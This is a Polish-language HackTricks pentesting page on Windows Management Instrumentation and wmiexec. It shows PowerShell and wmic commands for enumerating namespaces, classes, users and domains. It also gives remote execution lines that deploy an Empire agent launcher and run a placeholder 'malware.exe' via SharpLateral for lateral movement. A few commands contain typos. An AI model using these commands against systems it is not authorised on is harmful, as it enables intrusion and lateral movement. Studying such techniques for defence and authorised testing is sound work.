# WmiExec

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Jak to działa

Procesy mogą być otwierane na hostach, gdzie znana jest nazwa użytkownika oraz hasło lub hash, za pomocą WMI. Komendy są wykonywane przy użyciu WMI przez Wmiexec, co zapewnia półinteraktywną powłokę.

**dcomexec.py:** Wykorzystując różne punkty końcowe DCOM, ten skrypt oferuje półinteraktywną powłokę podobną do wmiexec.py, szczególnie wykorzystując obiekt DCOM ShellBrowserWindow. Obecnie obsługuje obiekty MMC20. Application, Shell Windows i Shell Browser Window. (źródło: [Hacking Articles](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/))

## Podstawy WMI

### Przestrzeń nazw

Strukturalnie w hierarchii przypominającej katalog, najwyższym kontenerem WMI jest \root, pod którym zorganizowane są dodatkowe katalogi, zwane przestrzeniami nazw.
Komendy do wyświetlenia przestrzeni nazw:
```bash
# Retrieval of Root namespaces
gwmi -namespace "root" -Class "__Namespace" | Select Name

# Enumeration of all namespaces (administrator privileges may be required)
Get-WmiObject -Class "__Namespace" -Namespace "Root" -List -Recurse 2> $null | select __Namespace | sort __Namespace

# Listing of namespaces within "root\cimv2"
Get-WmiObject -Class "__Namespace" -Namespace "root\cimv2" -List -Recurse 2> $null | select __Namespace | sort __Namespace
```
Klasy w obrębie przestrzeni nazw można wylistować za pomocą:
```bash
gwmwi -List -Recurse # Defaults to "root\cimv2" if no namespace specified
gwmi -Namespace "root/microsoft" -List -Recurse
```
### **Klasy**

Znajomość nazwy klasy WMI, takiej jak win32\_process, oraz przestrzeni nazw, w której się znajduje, jest kluczowa dla każdej operacji WMI.  
Polecenia do wyświetlenia klas zaczynających się od `win32`:
```bash
Get-WmiObject -Recurse -List -class win32* | more # Defaults to "root\cimv2"
gwmi -Namespace "root/microsoft" -List -Recurse -Class "MSFT_MpComput*"
```
Wywołanie klasy:
```bash
# Defaults to "root/cimv2" when namespace isn't specified
Get-WmiObject -Class win32_share
Get-WmiObject -Namespace "root/microsoft/windows/defender" -Class MSFT_MpComputerStatus
```
### Metody

Metody, które są jedną lub więcej funkcjami wykonywalnymi klas WMI, mogą być wykonywane.
```bash
# Class loading, method listing, and execution
$c = [wmiclass]"win32_share"
$c.methods
# To create a share: $c.Create("c:\share\path","name",0,$null,"My Description")
```

```bash
# Method listing and invocation
Invoke-WmiMethod -Class win32_share -Name Create -ArgumentList @($null, "Description", $null, "Name", $null, "c:\share\path",0)
```
## WMI Enumeration

### WMI Service Status

Polecenia do weryfikacji, czy usługa WMI działa:
```bash
# WMI service status check
Get-Service Winmgmt

# Via CMD
net start | findstr "Instrumentation"
```
### Informacje o systemie i procesach

Zbieranie informacji o systemie i procesach za pomocą WMI:
```bash
Get-WmiObject -ClassName win32_operatingsystem | select * | more
Get-WmiObject win32_process | Select Name, Processid
```
Dla atakujących WMI jest potężnym narzędziem do enumeracji wrażliwych danych o systemach lub domenach.
```bash
wmic computerystem list full /format:list
wmic process list /format:list
wmic ntdomain list /format:list
wmic useraccount list /format:list
wmic group list /format:list
wmic sysaccount list /format:list
```
Remote querying of WMI for specific information, such as local admins or logged-on users, is feasible with careful command construction.

### **Ręczne zdalne zapytania WMI**

Ciche identyfikowanie lokalnych administratorów na zdalnej maszynie oraz zalogowanych użytkowników można osiągnąć poprzez specyficzne zapytania WMI. `wmic` wspiera również odczyt z pliku tekstowego, aby wykonać polecenia na wielu węzłach jednocześnie.

Aby zdalnie wykonać proces za pomocą WMI, na przykład wdrażając agenta Empire, stosuje się następującą strukturę polecenia, a pomyślne wykonanie jest wskazywane przez wartość zwracaną "0":
```bash
wmic /node:hostname /user:user path win32_process call create "empire launcher string here"
```
Ten proces ilustruje zdolność WMI do zdalnego wykonywania i enumeracji systemu, podkreślając jego użyteczność zarówno w administracji systemem, jak i w pentestingu.

## References
* [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)

## Automatic Tools

* [**SharpLateral**](https://github.com/mertdas/SharpLateral):

{% code overflow="wrap" %}
```bash
SharpLateral redwmi HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe
```
{% endcode %}

{% hint style="success" %}
Ucz się i ćwicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel się trikami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.

</details>
{% endhint %}
